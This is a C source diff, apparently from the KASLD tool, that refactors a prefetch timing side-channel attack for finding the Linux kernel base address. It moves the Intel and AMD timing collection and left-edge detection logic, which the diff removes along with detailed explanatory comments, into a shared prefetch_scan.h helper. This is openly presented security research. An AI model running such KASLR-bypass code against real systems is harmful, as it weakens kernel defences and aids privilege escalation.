@@ -102,6 +102,7 @@
 #define _GNU_SOURCE
 #include "include/kasld/api.h"
 #include "include/kasld/cli.h"
+#include "include/prefetch_scan.h"
 #include "include/sidechannel.h"
 #include <stdio.h>
 #include <stdlib.h>
@@ -124,206 +125,15 @@ KASLD_META("method:timing\n"
 static int verbose = 0;
 
 // ---------------------------------------------------------------------------
-// Collect per-slot timing data.
-//
-// For each slot, takes the minimum across all measured iterations.
-// The minimum is the least-noised sample and produces a cleaner signal
-// than averaging, which dilutes outliers but also dilutes the real
-// timing differential.
-//
-// No syscall between probes: unlike EntryBleed (which measures
-// TLB state populated by the syscall entry path), the classic
-// prefetch attack measures page-table-walk latency. The page table
-// hierarchy is static — a syscall between probes only adds noise
-// and overhead.
+// The kernel text KASLR window: NUM_SLOTS candidate positions of STEP bytes.
+// The scan and left-edge detection live in prefetch_scan.h; CONFIRM_K/M tune
+// the AMD cluster confirmation to the ~15-slot kernel text block.
 // ---------------------------------------------------------------------------
-
 #define STEP KASLR_VIRT_ALIGN
 #define NUM_SLOTS ((KERNEL_VIRT_TEXT_MAX - KERNEL_VIRT_TEXT_MIN) / STEP)
 #define ITERATIONS 64
-#define WARMUP 3
-
-static void collect_timings(uint64_t *times) {
-  unsigned long idx;
-  int i;
-
-  for (idx = 0; idx < NUM_SLOTS; idx++)
-    times[idx] = ~(uint64_t)0;
-
-  for (i = 0; i < WARMUP + ITERATIONS; i++) {
-    for (idx = 0; idx < NUM_SLOTS; idx++) {
-      uint64_t target = KERNEL_VIRT_TEXT_MIN + idx * STEP;
-      uint64_t t = time_prefetch(target);
-
-      if (i >= WARMUP && t < times[idx])
-        times[idx] = t;
-    }
-  }
-}
-
-// ---------------------------------------------------------------------------
-// Collect per-slot timing data using sum across iterations.
-//
-// On AMD CPUs with coarsely quantized rdtscp (e.g. 36-cycle steps),
-// min and median lose information: min collapses to the floor when
-// even one fast outlier occurs, and median snaps to a single quantum
-// when the slow/fast split is near 50/50. Summing all samples
-// preserves the proportion of slow vs fast measurements as a
-// continuous value, enabling edge detection even when the per-sample
-// signal is smaller than one rdtscp quantum.
-// ---------------------------------------------------------------------------
-static void collect_timings_amd(uint64_t *times) {
-  unsigned long idx;
-  int i;
-
-  for (idx = 0; idx < NUM_SLOTS; idx++)
-    times[idx] = 0;
-
-  for (i = 0; i < WARMUP; i++)
-    for (idx = 0; idx < NUM_SLOTS; idx++)
-      time_prefetch(KERNEL_VIRT_TEXT_MIN + idx * STEP);
-
-  for (i = 0; i < ITERATIONS; i++)
-    for (idx = 0; idx < NUM_SLOTS; idx++)
-      times[idx] += time_prefetch(KERNEL_VIRT_TEXT_MIN + idx * STEP);
-}
-
-// ---------------------------------------------------------------------------
-// Dump per-slot timing data to stderr (verbose mode).
-// ---------------------------------------------------------------------------
-static void dump_timings(const uint64_t *times, const char *stat) {
-  unsigned long idx;
-  fprintf(stderr, "# slot addr %s\n", stat);
-  for (idx = 0; idx < NUM_SLOTS; idx++) {
-    fprintf(stderr, "%3lu 0x%lx %lu\n", idx,
-            (unsigned long)(KERNEL_VIRT_TEXT_MIN + idx * STEP),
-            (unsigned long)times[idx]);
-  }
-}
-
-// ---------------------------------------------------------------------------
-// qsort comparator over per-slot times (baseline / median estimation).
-// ---------------------------------------------------------------------------
-static int cmp_u64(const void *a, const void *b) {
-  uint64_t va = *(const uint64_t *)a;
-  uint64_t vb = *(const uint64_t *)b;
-  return (va > vb) - (va < vb);
-}
-
-// ---------------------------------------------------------------------------
-// Intel strategy: left-edge detection.
-//
-// Mapped pages resolve FASTER on Intel, so the kernel text is a contiguous run
-// of low-latency slots. The kernel BASE is the LEFT EDGE of that run — NOT the
-// global minimum, which lands on the hottest body page (usually a few slots in,
-// where frequently-executed .text lives) and so reports the base one or more
-// slots high.
-//
-// The global minimum is still a sound SEED: it is guaranteed to sit inside the
-// mapped kernel, because min-over-iterations removes upward scheduler noise, so
-// no unmapped slot reads faster than a mapped one. From that seed, walk LEFT to
-// the unmapped -> mapped transition. The stop bound is the midpoint between the
-// unmapped baseline (median) and the fastest mapped slot, so it adapts to the
-// signal magnitude, and an unmapped slot (at ~baseline) never crosses it — the
-// walk halts exactly at the base and can never place it below _text.
-// ---------------------------------------------------------------------------
-static unsigned long find_base_intel(const uint64_t *times) {
-  uint64_t sorted[NUM_SLOTS];
-  memcpy(sorted, times, sizeof(sorted));
-  qsort(sorted, NUM_SLOTS, sizeof(uint64_t), cmp_u64);
-  uint64_t baseline = sorted[NUM_SLOTS / 2];
-
-  uint64_t min_time = ~(uint64_t)0;
-  unsigned long seed = 0, idx;
-  for (idx = 0; idx < NUM_SLOTS; idx++) {
-    if (times[idx] < min_time) {
-      min_time = times[idx];
-      seed = idx;
-    }
-  }
-
-  /* midpoint(baseline, fastest): below it a slot is mapped, at/above it is the
-   * unmapped baseline. min_time <= baseline always, so the subtraction is safe.
-   */
-  uint64_t edge_bound = baseline - (baseline - min_time) / 2;
-  while (seed > 0 && times[seed - 1] < edge_bound)
-    seed--;
-
-  return KERNEL_VIRT_TEXT_MIN + seed * STEP;
-}
-
-// ---------------------------------------------------------------------------
-// AMD strategy: threshold-based detection with confirmation.
-//
-// On AMD, mapped pages produce higher prefetch latency than unmapped.
-// The per-slot sums reflect this: unmapped slots cluster around a
-// baseline value, while kernel-mapped slots are significantly higher.
-//
-// Algorithm:
-// 1. Sort a copy of the sums to find the median — a robust estimate
-//    of the unmapped baseline (since most slots are unmapped).
-// 2. Set threshold = median * 3/2 (50% above baseline). This sits
-//    between PDP entry boundary artifacts (~20% above baseline,
-//    7 slots wide every 128 slots) and kernel mapping (~70% above).
-// 3. Scan left-to-right for the leftmost slot where at least
-//    CONFIRM_K of the next CONFIRM_M slots exceed the threshold.
-//    This confirmation requirement filters isolated scheduling
-//    outliers (which spike a single slot to 10x+).
-// 4. Walk that cluster's LEFT EDGE out to the baseline transition with a
-//    looser 1.25x bound. The strict threshold is tuned to the kernel body and
-//    can drop the weaker base slot; the looser walk recovers it, and unmapped
-//    slots (~1.0x) never cross it, so it never places the base below _text.
-//
-// Returns 0 if no confirmed cluster is found (attack fails on this
-// CPU, or KPTI-like mitigation is active).
-// ---------------------------------------------------------------------------
 #define CONFIRM_K 5
 #define CONFIRM_M 8
-
-static unsigned long find_base_amd(const uint64_t *times) {
-  uint64_t sorted[NUM_SLOTS];
-  unsigned long idx;
-
-  memcpy(sorted, times, sizeof(sorted));
-  qsort(sorted, NUM_SLOTS, sizeof(uint64_t), cmp_u64);
-
-  uint64_t median = sorted[NUM_SLOTS / 2];
-  uint64_t threshold = median + median / 2;
-
-  if (verbose)
-    fprintf(stderr, "# AMD threshold: %lu (median=%lu)\n",
-            (unsigned long)threshold, (unsigned long)median);
-
-  for (idx = 0; idx + CONFIRM_M <= NUM_SLOTS; idx++) {
-    /* The candidate slot itself must be above threshold — prevents
-       the window from triggering early when unmapped slots precede
-       the actual kernel boundary. */
-    if (times[idx] <= threshold)
-      continue;
-    int count = 0;
-    unsigned long j;
-    for (j = 0; j < CONFIRM_M; j++) {
-      if (times[idx + j] > threshold)
-        count++;
-    }
-    if (count >= CONFIRM_K) {
-      /* The strict 1.5x threshold is tuned to the kernel BODY (~1.7x baseline)
-       * and can miss the BASE slot, whose mapped signal is weaker (head/entry
-       * text is less hot): it clears the unmapped baseline decisively but sits
-       * only marginally above the cluster threshold, so a noisy pass drops it
-       * and the cluster starts one slot high. Walk the left edge out to the
-       * baseline transition with a looser baseline-relative bound (1.25x):
-       * unmapped slots sit at ~1.0x and never cross it, so the walk recovers
-       * the base slot and halts at _text without ever going below it. */
-      uint64_t edge_bound = median + median / 4;
-      while (idx > 0 && times[idx - 1] > edge_bound)
-        idx--;
-      return KERNEL_VIRT_TEXT_MIN + idx * STEP;
-    }
-  }
-
-  return 0;
-}
 
 // ---------------------------------------------------------------------------
 // Majority vote across multiple passes.
@@ -336,19 +146,18 @@ static unsigned long majority_vote(int cpu_vendor, int *n_found) {
   int i;
 
   for (i = 0; i < NUM_PASSES; i++) {
-    if (cpu_vendor == CPU_VENDOR_AMD)
-      collect_timings_amd(times);
-    else
-      collect_timings(times);
+    prefetch_scan_collect(times, NUM_SLOTS, KERNEL_VIRT_TEXT_MIN, STEP,
+                          cpu_vendor, ITERATIONS);
 
     if (verbose && i == 0)
-      dump_timings(times,
-                   cpu_vendor == CPU_VENDOR_AMD ? "sum_cycles" : "min_cycles");
+      prefetch_scan_dump(times, NUM_SLOTS, KERNEL_VIRT_TEXT_MIN, STEP,
+                         cpu_vendor == CPU_VENDOR_AMD ? "sum_cycles"
+                                                      : "min_cycles");
 
-    if (cpu_vendor == CPU_VENDOR_AMD)
-      results[i] = find_base_amd(times);
-    else
-      results[i] = find_base_intel(times);
+    long edge = prefetch_scan_find_edge(times, NUM_SLOTS, cpu_vendor, CONFIRM_K,
+                                        CONFIRM_M);
+    results[i] =
+        edge < 0 ? 0 : KERNEL_VIRT_TEXT_MIN + (unsigned long)edge * STEP;
 
     if (verbose)
       fprintf(stderr, "# pass %d: 0x%lx\n", i, results[i]);
